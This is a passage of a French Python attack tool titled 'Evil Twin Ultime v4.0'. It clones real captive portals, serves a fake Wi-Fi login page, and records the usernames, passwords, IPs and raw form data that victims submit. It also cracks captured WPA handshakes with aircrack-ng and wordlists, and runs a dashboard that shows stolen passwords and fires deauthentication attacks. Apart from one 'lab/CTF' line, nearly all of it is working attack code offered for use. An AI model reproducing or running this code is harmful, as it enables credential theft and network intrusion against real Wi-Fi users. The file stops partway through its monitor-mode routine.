#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
EVIL TWIN ULTIME - JATHNIEL EDITION v4.0

Nouveautes v4.0:
[ADD] Clonage automatique du portail captif reel (scrape + replay)
[ADD] Dashboard web de pilotage (http://127.0.0.1:9090)
[ADD] Wrapper screen + service systemd (survit a la fermeture du terminal)
[ADD] Crack WPA offline integre (aircrack-ng + wordlists + stats)
[KEEP] Toutes les corrections v3.0

Usage strictement reserve au lab/CTF.
"""

import os
import sys
import time
import json
import threading
import subprocess
import socket
import re
import http.server
import socketserver
import shutil
import signal
import ssl
import tempfile
import html as html_module
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple

# ==================== VERIFICATIONS ====================

def check_root():
    if os.geteuid() != 0:
        print("❌ Privileges root requis. sudo python3 evil_twin.py")
        sys.exit(1)


def check_dependencies():
    deps = ["airbase-ng", "aireplay-ng", "airodump-ng", "airmon-ng",
            "iwconfig", "macchanger", "dnsmasq", "arp-scan", "iptables"]
    missing = [d for d in deps if shutil.which(d) is None]
    if missing:
        print(f"❌ Manquants: {', '.join(missing)}")
        print("   sudo apt-get install aircrack-ng macchanger dnsmasq arp-scan iptables")
        sys.exit(1)
    print("✅ Dependances systeme OK")


# ==================== PAGE PHISHING PAR DEFAUT ====================

DEFAULT_PHISHING_HTML = r"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Connexion WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background:linear-gradient(135deg,#667eea,#764ba2)}
.card{background:#fff;border-radius:20px;padding:40px 32px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.logo{width:70px;height:70px;margin:0 auto 20px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50%;display:flex;align-items:center;justify-content:center}
.logo svg{width:36px;height:36px;fill:#fff}
h1{color:#333;font-size:22px;text-align:center;margin-bottom:8px}
.sub{color:#888;font-size:13px;text-align:center;margin-bottom:24px}
.ssid{display:inline-block;padding:6px 14px;background:#f0f4ff;color:#4a5fc1;border-radius:20px;font-size:13px;font-weight:600;margin-bottom:24px}
.ssid-wrap{text-align:center;margin-bottom:20px}
label{display:block;font-size:12px;color:#666;font-weight:600;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
input{width:100%;padding:14px 16px;border:2px solid #e5e7eb;border-radius:10px;font-size:15px;transition:.2s;margin-bottom:16px}
input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1)}
button{width:100%;padding:15px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;transition:.2s}
button:hover{transform:translateY(-1px);box-shadow:0 10px 25px rgba(102,126,234,.3)}
button:disabled{opacity:.7;cursor:wait}
.foot{margin-top:20px;text-align:center;font-size:11px;color:#aaa}
</style>
</head>
<body>
<div class="card">
<div class="logo"><svg viewBox="0 0 24 24"><path d="M12 3C7.46 3 3.34 4.78.29 7.67c-.18.18-.29.43-.29.71 0 .28.11.53.29.71l11 11c.39.39 1.02.39 1.41 0l11-11c.18-.18.29-.43.29-.71 0-.28-.11-.53-.29-.71C20.66 4.78 16.54 3 12 3z"/></svg></div>
<h1>Connexion securisee</h1>
<p class="sub">Identifiez-vous pour acceder au reseau</p>
<div class="ssid-wrap"><span class="ssid">📶 __SSID__</span></div>
<form method="POST" action="/login" onsubmit="this.querySelector('button').disabled=true;this.querySelector('button').textContent='Connexion...'">
<label>Nom d'utilisateur</label>
<input type="text" name="username" placeholder="Entrez votre nom" required autocomplete="username">
<label>Mot de passe</label>
<input type="password" name="password" placeholder="Entrez le mot de passe" required autocomplete="current-password">
<button type="submit">Se connecter</button>
</form>
<div class="foot">🔒 Connexion WPA2 securisee</div>
</div>
</body>
</html>
"""

SUCCESS_HTML = r"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Connexion reussie</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;background:linear-gradient(135deg,#667eea,#764ba2);padding:20px}
.card{background:#fff;border-radius:20px;padding:50px 32px;max-width:400px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.check{width:80px;height:80px;margin:0 auto 20px;background:#4CAF50;border-radius:50%;display:flex;align-items:center;justify-content:center;animation:p 1.5s infinite}
@keyframes p{0%,100%{box-shadow:0 0 0 0 rgba(76,175,80,.7)}70%{box-shadow:0 0 0 20px rgba(76,175,80,0)}}
.check svg{width:45px;height:45px;fill:#fff}
h1{color:#333;font-size:22px;margin-bottom:12px}
p{color:#666;font-size:14px;line-height:1.6}
.ssid{color:#667eea;font-weight:700}
.note{margin-top:24px;padding-top:20px;border-top:1px solid #eee;color:#999;font-size:12px}
</style>
</head>
<body>
<div class="card">
<div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h1>Connexion reussie</h1>
<p>Vous etes connecte au reseau <span class="ssid">__SSID__</span>.</p>
<p>Vous pouvez fermer cette page.</p>
<div class="note">Redirection automatique...</div>
</div>
<script>setTimeout(()=>location.href='http://www.google.com',5000)</script>
</body>
</html>
"""


# ==================== MODULE 1 : CLONEUR DE PORTAIL ====================

class CaptivePortalCloner:
    """Scrape un portail captif reel et le rejoue en injectant la capture."""

    def __init__(self, engine_log=None):
        self.log = engine_log or print
        self.html = None
        self.assets = {}          # path -> bytes
        self.login_action = None
        self.form_method = "POST"
        self.username_field = "username"
        self.password_field = "password"
        self.base_url = None
        self.raw_html = None

    def clone(self, url: str) -> bool:
        """Telecharge le portail et extrait les assets + le formulaire."""
        self.log(f"🎭 Clonage du portail: {url}")
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                              "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"
            })
            with urllib.request.urlopen(req, timeout=15, context=ssl._create_unverified_context()) as r:
                content_type = r.headers.get("Content-Type", "")
                body = r.read()
                if "charset=" in content_type:
                    enc = content_type.split("charset=")[1].split(";")[0].strip()
                    try:
                        html_text = body.decode(enc, errors="ignore")
                    except Exception:
                        html_text = body.decode("utf-8", errors="ignore")
                else:
                    html_text = body.decode("utf-8", errors="ignore")
        except Exception as e:
            self.log(f"❌ Clone: {e}")
            return False

        self.raw_html = html_text
        self.base_url = url

        # Extraire le formulaire de login
        self._extract_form(html_text)

        # Telecharger les assets (CSS, JS, images) et reecrire les URLs
        self.html = self._rewrite_and_download_assets(html_text, url)

        # Injecter un petit script qui enregistre le submit cote serveur
        # (le POST va deja vers /login, c'est gere par le handler)
        self.log(f"✅ Portail clone ({len(self.html)} octets, {len(self.assets)} assets)")
        return True

    def _extract_form(self, html_text: str):
        """Trouve l'action du formulaire et les noms des champs."""
        form_re = re.compile(
            r"<form[^>]*action=[\"']([^\"']+)[\"'][^>]*method=[\"']([^\"']+)[\"'][^>]*>"
            r"(.*?)</form>",
            re.IGNORECASE | re.DOTALL
        )
        # Essayer aussi method avant action
        forms = form_re.findall(html_text)
        if not forms:
            form_re2 = re.compile(
                r"<form[^>]*method=[\"']([^\"']+)[\"'][^>]*action=[\"']([^\"']+)[\"'][^>]*>"
                r"(.*?)</form>",
                re.IGNORECASE | re.DOTALL
            )
            for method, action, body in form_re2.findall(html_text):
                forms.append((action, method, body))

        for action, method, body in forms:
            inputs = re.findall(r"<input[^>]*>", body, re.IGNORECASE)
            has_password = any('type=["\']password["\']' in i.lower() for i in inputs)
            if not has_password:
                continue

            self.login_action = action
            self.form_method = method.upper()
            for i in inputs:
                name_m = re.search(r'name=["\']([^"\']+)["\']', i, re.IGNORECASE)
                type_m = re.search(r'type=["\']([^"\']+)["\']', i, re.IGNORECASE)
                if name_m and type_m:
                    t = type_m.group(1).lower()
                    if t == "password":
                        self.password_field = name_m.group(1)
                    elif t in ("text", "email") and self.username_field == "username":
                        self.username_field = name_m.group(1)
            self.log(f"   Formulaire: action='{self.login_action}' method={self.form_method}")
            self.log(f"   Champs: user='{self.username_field}' pass='{self.password_field}'")
            return

        self.log("   ⚠️ Pas de formulaire de login detecte, fallback par defaut")

    def _rewrite_and_download_assets(self, html_text: str, base_url: str) -> str:
        """Telecharge les CSS/JS/images et reecrit les URLs en local."""
        # Trouver toutes les URLs d'assets
        patterns = [
            (re.compile(r'(<link[^>]+href=["\'])([^"\']+)(["\'])', re.IGNORECASE), "href"),
            (re.compile(r'(<script[^>]+src=["\'])([^"\']+)(["\'])', re.IGNORECASE), "src"),
            (re.compile(r'(<img[^>]+src=["\'])([^"\']+)(["\'])', re.IGNORECASE), "src"),
        ]

        replacements = {}

        for pat, _ in patterns:
            for m in pat.finditer(html_text):
                url = m.group(2)
                if url.startswith("data:") or url.startswith("#"):
                    continue
                abs_url = urllib.parse.urljoin(base_url, url)
                if abs_url in replacements:
                    continue
                local_path = self._download_asset(abs_url)
                if local_path:
                    replacements[abs_url] = local_path
                    replacements[url] = local_path

        # Remplacer
        for old, new in replacements.items():
            html_text = html_text.replace(f'"{old}"', f'"{new}"')
            html_text = html_text.replace(f"'{old}'", f"'{new}'")

        # Reecrire l'action du formulaire vers /login
        if self.login_action:
            html_text = re.sub(
                r'(<form[^>]*action=["\'])' + re.escape(self.login_action) + r'(["\'])',
                r'\1/login\2',
                html_text, flags=re.IGNORECASE
            )

        # Injecter un marqueur discret
        html_text = html_text.replace("</body>",
            "<!-- cloned by JATHNIEL Evil Twin v4.0 --></body>")

        return html_text

    def _download_asset(self, url: str) -> Optional[str]:
        try:
            path = urllib.parse.urlparse(url).path
            ext = os.path.splitext(path)[1] or ".bin"
            # Nom local stable
            key = "a" + format(abs(hash(url)), "x")[:12] + ext
            local = "/assets/" + key

            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            })
            with urllib.request.urlopen(req, timeout=10,
                                        context=ssl._create_unverified_context()) as r:
                data = r.read(2 * 1024 * 1024)  # max 2 Mo par asset
            self.assets[local] = data
            return local
        except Exception:
            return None

    def render(self, ssid: str) -> bytes:
        """Retourne le HTML avec le SSID injecte."""
        if not self.html:
            return DEFAULT_PHISHING_HTML.replace("__SSID__", html_module.escape(ssid)).encode("utf-8")
        out = self.html
        out = re.sub(r"__SSID__", html_module.escape(ssid), out)
        out = out.replace("{{SSID}}", html_module.escape(ssid))
        return out.encode("utf-8")


# ==================== SERVEUR PHISHING ====================

class PhishingHandler(http.server.BaseHTTPRequestHandler):
    ssid = "WiFi"
    passwords = []
    password_callback = None
    lock = threading.Lock()
    portal_cloner = None      # CaptivePortalCloner ou None
    use_default_page = True

    def _get_page(self) -> bytes:
        if self.use_default_page or not self.portal_cloner:
            return DEFAULT_PHISHING_HTML.replace("__SSID__", html_module.escape(self.ssid)).encode("utf-8")
        return self.portal_cloner.render(self.ssid)

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            body = self._get_page()
            self._send(200, "text/html; charset=utf-8", body)
        elif self.path == "/success":
            body = SUCCESS_HTML.replace("__SSID__", html_module.escape(self.ssid)).encode("utf-8")
            self._send(200, "text/html; charset=utf-8", body)
        elif self.path.startswith("/assets/") and self.portal_cloner:
            data = self.portal_cloner.assets.get(self.path)
            if data:
                self._send(200, self._guess_mime(self.path), data)
            else:
                self._send(404, "text/plain", b"not found")
        else:
            # Redirection style portail captif
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()

    def do_POST(self):
        if self.path not in ("/login", "/", "/index.html"):
            # On accepte tout POST qui contient un password, peu importe le path
            pass

        try:
            length = int(self.headers.get("Content-Length", 0) or 0)
            raw = self.rfile.read(length).decode("utf-8", errors="ignore") if length else ""
        except Exception:
            raw = ""

        params = urllib.parse.parse_qs(raw)

        # Chercher les champs importants (avec fallback sur noms courants)
        username = ""
        password = ""

        # Priorite : champs detectes par le cloneur
        if self.portal_cloner:
            upf = self.portal_cloner.username_field
            ppf = self.portal_cloner.password_field
            if upf in params:
                username = params[upf][0]
            if ppf in params:
                password = params[ppf][0]

        # Fallback : chercher tout champ qui ressemble
        if not password:
            for k, v in params.items():
                kl = k.lower()
                if any(x in kl for x in ("pass", "pwd", "motdepasse", "wifi_key", "key")):
                    password = v[0]
                    break
        if not username:
            for k, v in params.items():
                kl = k.lower()
                if any(x in kl for x in ("user", "login", "email", "ident", "name")):
                    username = v[0]
                    break

        # Enregistrer meme si un seul champ est rempli (info partielle utile)
        if password or username:
            entry = {
                "username": username,
                "password": password,
                "ip": self.client_address[0],
                "user_agent": self.headers.get("User-Agent", ""),
                "raw_post": raw[:2000],
                "timestamp": datetime.now().isoformat(),
            }
            with PhishingHandler.lock:
                PhishingHandler.passwords.append(entry)
            if PhishingHandler.password_callback:
                try:
                    PhishingHandler.password_callback(password, self.client_address[0])
                except Exception:
                    pass
            print(f"[{time.strftime('%H:%M:%S')}] 🔑 CAPTURE user='{username}' pass='{password}' ip={self.client_address[0]}")

        self.send_response(302)
        self.send_header("Location", "/success")
        self.end_headers()

    def _send(self, code, ctype, body):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _guess_mime(self, path):
        ext = os.path.splitext(path)[1].lower()
        return {
            ".css": "text/css", ".js": "application/javascript",
            ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
            ".gif": "image/gif", ".svg": "image/svg+xml", ".ico": "image/x-icon",
            ".woff": "font/woff", ".woff2": "font/woff2", ".ttf": "font/ttf",
        }.get(ext, "application/octet-stream")

    def log_message(self, *args, **kwargs):
        pass


class PhishingServer:
    def __init__(self, port=80, ssid="WiFi", password_callback=None,
                 use_https=False, portal_cloner=None):
        self.port = port
        self.ssid = ssid
        self.server = None
        self.thread = None
        self.running = False
        self.use_https = use_https
        PhishingHandler.ssid = ssid
        PhishingHandler.password_callback = password_callback
        PhishingHandler.portal_cloner = portal_cloner
        PhishingHandler.use_default_page = (portal_cloner is None)

    def _make_ssl_context(self):
        cert_dir = tempfile.mkdtemp(prefix="eviltwin_cert_")
        cert_path = os.path.join(cert_dir, "cert.pem")
        key_path = os.path.join(cert_dir, "key.pem")
        try:
            subprocess.run(
                ["openssl", "req", "-x509", "-newkey", "rsa:2048",
                 "-keyout", key_path, "-out", cert_path,
                 "-days", "1", "-nodes", "-subj", f"/CN={self.ssid}"],
                check=True, capture_output=True
            )
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)
            return ctx
        except Exception as e:
            print(f"⚠️ HTTPS indisponible ({e}), fallback HTTP")
            return None

    def start(self):
        if self.running:
            return
        self.running = True
        self.server = socketserver.ThreadingTCPServer(("0.0.0.0", self.port), PhishingHandler)
        self.server.allow_reuse_address = True
        if self.use_https:
            ctx = self._make_ssl_context()
            if ctx:
                self.server.socket = ctx.wrap_socket(self.server.socket, server_side=True)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        proto = "HTTPS" if self.use_https else "HTTP"
        print(f"[+] Serveur phishing {proto} sur port {self.port} (SSID: {self.ssid})")

    def stop(self):
        self.running = False
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception:
                pass

    def get_passwords(self):
        with PhishingHandler.lock:
            return PhishingHandler.passwords.copy()


# ==================== MODULE 5 : CRACK WPA OFFLINE ====================

class WPACracker:
    """Crack offline d'un .cap via aircrack-ng."""

    DEFAULT_WORDLISTS = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/usr/share/wordlists/fasttrack.txt",
        "/usr/share/wordlists/nmap.lst",
    ]

    def __init__(self, log=None):
        self.log = log or print
        self.results = []   # liste de dicts {cap, bssid, essid, password, duration}

    def find_wordlists(self) -> List[str]:
        found = []
        for w in self.DEFAULT_WORDLISTS:
            if os.path.exists(w):
                found.append(w)
        # Chercher aussi dans /usr/share/wordlists/
        d = "/usr/share/wordlists"
        if os.path.isdir(d):
            for f in os.listdir(d):
                p = os.path.join(d, f)
                if os.path.isfile(p) and p not in found:
                    found.append(p)
        return found

    def crack(self, cap_path: str, wordlist: str,
              bssid: Optional[str] = None, essid: Optional[str] = None,
              timeout: int = 600) -> Dict[str, Any]:
        """Lance aircrack-ng sur le .cap. Retourne un dict resultat."""
        result = {
            "cap": cap_path,
            "wordlist": wordlist,
            "bssid": bssid,
            "essid": essid,
            "password": None,
            "duration": 0,
            "success": False,
            "error": None,
            "raw_output_tail": "",
        }

        if not os.path.exists(cap_path):
            result["error"] = "fichier .cap introuvable"
            return result
        if not os.path.exists(wordlist):
            result["error"] = "wordlist introuvable"
            return result

        cmd = ["aircrack-ng", "-w", wordlist, cap_path]
        if bssid:
            cmd = ["aircrack-ng", "-b", bssid, "-w", wordlist, cap_path]
        elif essid:
            cmd = ["aircrack-ng", "-e", essid, "-w", wordlist, cap_path]

        self.log(f"🔓 Crack: {' '.join(cmd)}")
        start = time.time()
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            output = proc.stdout + "\n" + proc.stderr
            result["raw_output_tail"] = output[-2000:]
            result["duration"] = time.time() - start

            m = re.search(r"KEY FOUND!\s*\[\s*([^\]]+?)\s*\]", output)
            if m:
                result["password"] = m.group(1).strip()
                result["success"] = True
                self.log(f"✅ Mot de passe trouve: {result['password']} en {result['duration']:.1f}s")
                self.results.append(result)
            else:
                result["error"] = "cle non trouvee dans la wordlist"
                self.log(f"❌ Cle non trouvee apres {result['duration']:.1f}s")
        except subprocess.TimeoutExpired:
            result["error"] = f"timeout ({timeout}s)"
            result["duration"] = time.time() - start
            self.log(f"⏱️  Timeout apres {timeout}s")
        except Exception as e:
            result["error"] = str(e)
            self.log(f"❌ Crack: {e}")

        return result

    def crack_all_handshakes(self, handshakes: List[str], wordlist: str,
                             timeout: int = 600) -> List[Dict[str, Any]]:
        out = []
        for cap in handshakes:
            r = self.crack(cap, wordlist, timeout=timeout)
            out.append(r)
        return out

    def export(self, path: str):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        self.log(f"✅ Resultats crack exportes: {path}")


# ==================== MODULE 2 : DASHBOARD WEB ====================

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Evil Twin - Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,'Segoe UI',sans-serif;background:#0f1419;color:#e5e7eb;padding:20px}
h1{font-size:22px;margin-bottom:4px;color:#fff}
.sub{color:#6b7280;font-size:13px;margin-bottom:24px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;margin-bottom:24px}
.card{background:#1a1f2e;border:1px solid #2a3142;border-radius:12px;padding:20px}
.card h2{font-size:13px;color:#9ca3af;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px}
.big{font-size:32px;font-weight:700;color:#60a5fa}
.card.ok .big{color:#4ade80}
.card.warn .big{color:#fbbf24}
.card.err .big{color:#f87171}
.panel{background:#1a1f2e;border:1px solid #2a3142;border-radius:12px;padding:20px;margin-bottom:16px}
.panel h3{font-size:14px;margin-bottom:12px;color:#d1d5db}
table{width:100%;border-collapse:collapse;font-size:13px}
th{text-align:left;color:#9ca3af;padding:8px;border-bottom:1px solid #2a3142;font-weight:500}
td{padding:10px 8px;border-bottom:1px solid #1f2534;color:#e5e7eb}
td.mono{font-family:ui-monospace,'SF Mono',monospace;color:#93c5fd}
.pill{display:inline-block;padding:3px 10px;border-radius:10px;font-size:11px;font-weight:600}
.pill.green{background:rgba(74,222,128,.15);color:#4ade80}
.pill.red{background:rgba(248,113,113,.15);color:#f87171}
.pill.gray{background:rgba(156,163,175,.15);color:#9ca3af}
.actions{display:flex;gap:8px;flex-wrap:wrap}
button{background:#2563eb;color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;transition:.15s}
button:hover{background:#1d4ed8}
button.danger{background:#dc2626}
button.danger:hover{background:#b91c1c}
button.ghost{background:transparent;border:1px solid #374151;color:#d1d5db}
button.ghost:hover{background:#1f2937}
pre{background:#0a0e16;padding:12px;border-radius:8px;font-size:12px;max-height:300px;overflow:auto;color:#93c5fd;border:1px solid #1f2937}
.refresh{font-size:11px;color:#6b7280}
</style>
</head>
<body>
<h1>🕵️ Evil Twin - Dashboard</h1>
<div class="sub">JATHNIEL EDITION v4.0 — <span class="refresh">auto-refresh 3s</span></div>

<div class="grid" id="stats">
<div class="card"><h2>Statut</h2><div class="big" id="status">-</div></div>
<div class="card"><h2>SSID</h2><div class="big" id="ssid" style="font-size:18px">-</div></div>
<div class="card ok"><h2>Mots de passe</h2><div class="big" id="nb_pw">0</div></div>
<div class="card"><h2>Handshakes</h2><div class="big" id="nb_hs">0</div></div>
<div class="card"><h2>Clients</h2><div class="big" id="nb_clients">0</div></div>
</div>

<div class="panel">
<h3>⚙️ Actions</h3>
<div class="actions">
<button onclick="act('deauth')">📡 Deauth broadcast</button>
<button onclick="act('stop')" class="danger">🛑 Arreter</button>
<button class="ghost" onclick="refresh()">🔄 Rafraichir</button>
</div>
</div>

<div class="panel">
<h3>🔑 Mots de passe captures</h3>
<table id="pw_table">
<thead><tr><th>Heure</th><th>User</th><th>Pass</th><th>IP</th></tr></thead>
<tbody></tbody>
</table>
</div>

<div class="panel">
<h3>👥 Clients connectes</h3>
<table id="cl_table">
<thead><tr><th>IP</th><th>MAC</th></tr></thead>
<tbody></tbody>
</table>
</div>

<div class="panel">
<h3>🤝 Handshakes</h3>
<pre id="hs_list">-</pre>
</div>

<div class="panel">
<h3>📜 Derniers logs</h3>
<pre id="logs">-</pre>
</div>

<script>
async function refresh(){
    try{
        const r=await fetch('/api/state');
        const d=await r.json();
        document.getElementById('status').textContent=d.running?'ACTIF':'ARRETE';
        document.getElementById('status').className='big';
        document.getElementById('ssid').textContent=d.ssid||'-';
        document.getElementById('nb_pw').textContent=d.passwords.length;
        document.getElementById('nb_hs').textContent=d.handshakes.length;
        document.getElementById('nb_clients').textContent=d.clients.length;

        const pt=document.querySelector('#pw_table tbody');
        pt.innerHTML=d.passwords.slice(-50).reverse().map(p=>
            `<tr><td>${p.timestamp.slice(11,19)}</td><td>${esc(p.username||'-')}</td>
            <td class="mono">${esc(p.password||'-')}</td><td>${p.ip}</td></tr>`).join('')||
            '<tr><td colspan="4" style="color:#6b7280">Aucun</td></tr>';

        const ct=document.querySelector('#cl_table tbody');
        ct.innerHTML=d.clients.map(c=>
            `<tr><td class="mono">${c.ip}</td><td class="mono">${c.mac}</td></tr>`).join('')||
            '<tr><td colspan="2" style="color:#6b7280">Aucun</td></tr>';

        document.getElementById('hs_list').textContent=d.handshakes.join('\n')||'Aucun';
        document.getElementById('logs').textContent=d.logs.slice(-30).reverse().join('\n');
    }catch(e){console.error(e)}
}
function esc(s){return String(s).replace(/[<>&"]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c]))}
async function act(a){await fetch('/api/action/'+a,{method:'POST'});refresh()}
refresh();
setInterval(refresh,3000);
</script>
</body>
</html>
"""


class DashboardHandler(http.server.BaseHTTPRequestHandler):
    engine = None   # injecte au demarrage

    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            body = DASHBOARD_HTML.encode("utf-8")
            self._send(200, "text/html; charset=utf-8", body)
        elif self.path == "/api/state":
            self._send_state()
        else:
            self._send(404, "text/plain", b"not found")

    def do_POST(self):
        if self.path.startswith("/api/action/"):
            action = self.path.rsplit("/", 1)[-1]
            self._do_action(action)
        else:
            self._send(404, "text/plain", b"not found")

    def _send_state(self):
        e = DashboardHandler.engine
        if not e:
            self._send(500, "application/json", b'{"error":"engine not set"}')
            return

        clients = []
        try:
            clients = e.get_clients()
        except Exception:
            pass

        # Lire les dernieres lignes de log
        logs = []
        try:
            if e.log_file.exists():
                with open(e.log_file, "r", encoding="utf-8", errors="ignore") as f:
                    logs = f.read().splitlines()[-50:]
        except Exception:
            pass

        state = {
            "running": e.running,
            "ssid": e.ap_name or "",
            "passwords": e.passwords,
            "handshakes": e.handshakes,
            "clients": clients,
            "logs": logs,
        }
        body = json.dumps(state, ensure_ascii=False, default=str).encode("utf-8")
        self._send(200, "application/json", body)

    def _do_action(self, action):
        e = DashboardHandler.engine
        try:
            if action == "deauth":
                e.deauth_attack()
            elif action == "stop":
                e.stop_attack()
            elif action == "export":
                e.export_all()
            else:
                self._send(400, "text/plain", b"unknown action")
                return
            self._send(200, "text/plain", b"ok")
        except Exception as ex:
            self._send(500, "text/plain", str(ex).encode())

    def _send(self, code, ctype, body):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args, **kwargs):
        pass


class DashboardServer:
    def __init__(self, engine, host="127.0.0.1", port=9090):
        self.engine = engine
        self.host = host
        self.port = port
        self.server = None
        self.thread = None

    def start(self):
        DashboardHandler.engine = self.engine
        self.server = socketserver.ThreadingTCPServer((self.host, self.port), DashboardHandler)
        self.server.allow_reuse_address = True
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        print(f"[+] Dashboard: http://{self.host}:{self.port}")

    def stop(self):
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception:
                pass


# ==================== MOTEUR EVIL TWIN ====================

class EvilTwinEngine:
    def __init__(self):
        self.running = False
        self.interface = None
        self.monitor_interface = None
        self.deauth_interface = None
        self.ap_name = None
        self.channel = "6"
        self.bssid = None
        self.original_bssid = None
        self.passwords = []
        self.handshakes = []
        self.processes = {}
        self.phishing_server = None
        self.dashboard_server = None
        self.stealth_mode = False
        self.status_callback = None
        self.log_dir = Path("logs")
        self.log_dir.mkdir(exist_ok=True)
        self.log_file = self.log_dir / f"eviltwin_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self.at0_ip = "10.0.0.1"
        self.dhcp_range = "10.0.0.10,10.0.0.100,12h"
        self._cleanup_done = False
        self.portal_cloner = None
        self.cracker = WPACracker(log=self.log)
        self.export_dir = Path("exports")
        self.export_dir.mkdir(exist_ok=True)

    def set_status_callback(self, callback):
        self.status_callback = callback

    def log(self, message):
        line = f"[{time.strftime('%H:%M:%S')}] {message}"
        if self.status_callback:
            self.status_callback(message)
        print(line)
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass

    # ---------- SCAN ----------

    def scan_wifi(self):
        self.log("📡 Scan WiFi...")
        iface = self.monitor_interface or self.interface or "wlan0"
        try:
            r = subprocess.run(["iwlist", iface, "scan"],
                               capture_output=True, text=True, timeout=30)
            if r.returncode != 0:
                self.log(f"❌ Scan code {r.returncode}")
                return []
            networks = []
            current = {}
            for line in r.stdout.split("\n"):
                line = line.strip()
                if "Cell" in line:
                    if current.get("ssid"):
                        networks.append(current)
                    current = {"address": "", "ssid": "", "channel": "", "encryption": "", "signal": ""}
                elif "Address:" in line:
                    current["address"] = line.split("Address:")[1].strip()
                elif "ESSID:" in line:
                    current["ssid"] = line.split("ESSID:")[1].strip().strip('"')
                elif "Channel:" in line:
                    current["channel"] = line.split("Channel:")[1].strip()
                elif "Encryption key:on" in line:
                    current["encryption"] = "WPA2"
                elif "Encryption key:off" in line:
                    current["encryption"] = "Open"
                elif "Quality=" in line:
                    m = re.search(r"Quality=(\d+)/(\d+)", line)
                    if m:
                        current["signal"] = m.group(1)
            if current.get("ssid"):
                networks.append(current)
            networks = [n for n in networks if n.get("ssid")]
            self.log(f"✅ {len(networks)} reseaux")
            return networks
        except Exception as e:
            self.log(f"❌ Scan: {e}")
            return []

    def list_interfaces(self):
        out = []
        try:
            r = subprocess.run(["iwconfig"], capture_output=True, text=True)
            for line in r.stdout.split("\n"):
                if "IEEE 802.11" in line:
                    out.append(line.split()[0])
        except Exception:
            pass
        return out

    def set_interface(self, iface):
        self.interface = iface

    def set_deauth_interface(self, iface):
        self.deauth_interface = iface

    def check_monitor_mode(self, iface=None):
        iface = iface or self.monitor_interface or self.interface
        if not iface:
            return False
        self.log(f"🔍 Monitor check sur {iface}...")
        try:
            r = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
            if "Mode:Monitor" in r.stdout:
                self.log(f"✅ {iface} deja monitor")
                self.monitor_interface = iface
                return True
        except Exception:
            pass
        try:
            self.log(f"🔄 airmon-ng start {iface}")
            subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, timeout=15)
            r = subprocess.run(["airmon-ng", "start", iface],
                               capture_output=True, text=True, timeout=20)
            m = re.search(r"monitor mode (?:vif )?enabled on (\S+)", r.stdout)
            cand = m.group(1) if m else f"{iface}mon"
            r2 = subprocess.run(["iwconfig", cand], capture_output=True, text=True)
            if "Mode:Monitor" in r2.stdout:
                self.monitor_interface = cand
                self.log(f"✅ Monitor: {cand}")
                return True
            r3 = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
            if "Mode:Monitor" in r3.stdout:
                self.monitor_interface = iface
                return True
